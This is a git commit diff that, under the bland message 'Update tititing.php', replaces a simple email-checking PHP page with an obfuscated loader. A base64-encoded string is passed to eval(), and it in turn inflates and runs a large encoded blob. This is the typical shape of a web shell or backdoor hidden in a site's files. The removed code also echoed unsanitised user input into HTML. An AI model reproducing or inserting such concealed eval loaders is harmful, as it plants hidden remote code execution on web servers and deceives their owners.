409c00e7e93bc613046490e4654f5777ff6fa59f
mithservice <124500929+mithservice@users.noreply.github.com>
2023-02-27 05:22:21 +0700

    Update tititing.php

--- web/tititing.php
+++ web/tititing.php
@@ -1,24 +1,3 @@
 <?php
-
-require_once 'ItuTitit.class.php'; 
-
-$mail = new ItuTitit();
-
-$mail->setStreamTimeoutWait(20);
-
-$mail->Debug= TRUE; 
-$mail->Debugoutput= 'html'; 
-
-$mail->setEmailFrom('info@myworld.com');
-
-$email = $_GET['email']; 
-
-if($mail->check($email)){ 
-    echo 'Email &lt;'.$email.'&gt; is exist!'; 
-}elseif(verifyEmail::validate($email)){ 
-    echo 'Email &lt;'.$email.'&gt; is valid, but not exist!'; 
-}else{ 
-    echo 'Email &lt;'.$email.'&gt; is not valid and not exist!'; 
-} 
-
+$SISTEMIT_COM_ENC = "3dTLqqNKFAbgecN5iU0PuskgXmPCZg8SrzFeouUl1qRBQcFLoU6ivlc/kAgOFAcOHIlwkj07r3CGBWt9xfoXVf/8+AmuwOLVq/WH1dU/vMb+/fr7Qc76aSyGs3AOn2EmhNesruqadGM67vsCXKVGKMxOV9tdj7G1mrQ33dPuKVWSRMTz09TL03ibhC7pDrvniEnNlsw0OlINdtxqXjQvsGmrZ3yOd7a/0ffQsF1188czWh1jXsh95xSiUamiufXHci+yoAGumTSkxAdbGfuIJXRLkRBlr9NBepiK1+Cs4i541OZafB1M7cKQ9O6BG6I0uKAQ4nlM8l1UM6SoJZQtOZhIR+I68Q7uE5wbJguCYRxymFxPgod0XyY7FlF0dG4nup1uyaEcnEcv2SCUG2AzSCkLXLTm3b7PAN8aPosHNOZEqOwIn/JuZ2RAo4amVqdMx0hwwO02lxN9qgvbq8le2C1mzPti64ANi9bpidnMo9yUZVq3WEIILcGw3aA4JDtuTovHWILw1q15l0p4feITpj3AZXCz3R5VMQ3FZq5IEg2b0u9PjlyNMxHjW1vSl3q99GYaPssYHoa0YMeFK+l1KO4jPyY9KW7MU4m3ikHueUyerlY03KikBgttrMnA0km6d3heSx+SvG+fB9/TlGtxUbUMddesxeXMe45RP1RRs/FAIyKWF+miPm6u02qQp4KoRwin2oaB7NmeA/JRWSVxc1KDe4jpKoI8pEzSHEKh7C0oN+V+yyC5z2g6xQ6ZOEbh2RWLwgNIXfPlFZDHHHRfOapow5ZKdr2LmBMGLd8nEzBALJ1BZ3eY5SZYY7IC7MKO7iSGotd9JK/7UXoqDBPctyfAd8zuwCUzczxXgbo90bCvHtbNzSs5SzK7Su4eTiHeEhpBlrOK7U/Htu6mCCsARscBfepYfBYHLVrr4oQd5/uGNkUrebXoQrWzoLYgtqOg3BKPXvCuBEP6DlVaZ1qZAjPV5VYnywP1YO6PcLZwd3f3iZN3Gz0ugXt2R6rbdAi3Vvn4/FkuaP7yl349UH/mNWjn9dcHSAJ8Ec3csFLZJAzCcwLcd2XJjC+LTUy560y6z9OFncHFxGHhxTLw+YGzU9NyEtqxU7sCKRR127RVTsheZ9zkB2tpZt52TzcDF8qFUBsbvXzughwyzVQ7p2eCIlZXa8A4aH5ScTCeb+tj7jRBiwOs3UyXVg0CDgClpB/PlkdqN6W5dBavZcF3P43ZhJlYZPAEmGYuWH4DfE56yaxB/OIGBA1t4uXHcvntc8K376bffq2Lb98sv/1Mo9++ms1vP1GTbz8x3v0ovfjpZAcYzUFiuAFbu0As5WzkQFdIkS1o7JqZV5DB2Hfg+35xSXPrVRuruEy/PPCaU1rFXDVwGX/lCQP+RKrvDN3h5qbTsojy2x7914MGuNncja+vj9+f67akv/67ru8V/v79+RNY+v3r4//yp358/vPjXw==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="FAbgecN5iU0PuskgXmPCZg8SrzFeouUl1qRBQcFLoU6ivlc/kAgOFAcOHIlwkj07r3CGBWt9xfoXVf/8+AmuwOLVq/WH1dU/vMb+/fr7Qc76aSyGs3AOn2EmhNesruqadGM67vsCXKVGKMxOV9tdj7G1mrQ33dPuKVWSRMTz09TL03ibhC7pDrvniEnNlsw0OlINdtxq";
 ?>
